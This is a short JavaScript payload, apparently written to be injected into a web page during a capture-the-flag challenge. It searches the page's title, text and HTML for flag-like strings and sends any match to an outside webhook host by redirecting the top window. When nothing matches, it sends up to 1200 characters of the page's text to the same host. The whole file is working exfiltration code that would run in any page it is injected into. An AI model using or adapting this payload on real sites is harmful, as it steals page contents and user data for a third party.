(() => {
  const WEBHOOK = 'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116';

  const pats = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon[a-z_]*\{[^}]+\}/i,
    /hc[a-z_]*\{[^}]+\}/i
  ];

  const go = (obj) => {
    const u = new URL(WEBHOOK);
    for (const [k, v] of Object.entries(obj)) {
      u.searchParams.set(k, String(v ?? ''));
    }
    top.location = u.toString();
  };

  const check = (where, text) => {
    if (!text) return false;
    for (const re of pats) {
      const m = text.match(re);
      if (m) {
        go({
          type: 'flag',
          where,
          href: location.href,
          title: document.title || '',
          value: m[0]
        });
        return true;
      }
    }
    return false;
  };

  try { if (check('title', document.title)) return; } catch {}
  try { if (check('body', document.body && document.body.innerText)) return; } catch {}
  try { if (check('html', document.documentElement && document.documentElement.outerHTML)) return; } catch {}

  go({
    type: 'noflag',
    href: location.href,
    title: document.title || '',
    body: (document.body && document.body.innerText || '').slice(0, 1200)
  });
})();
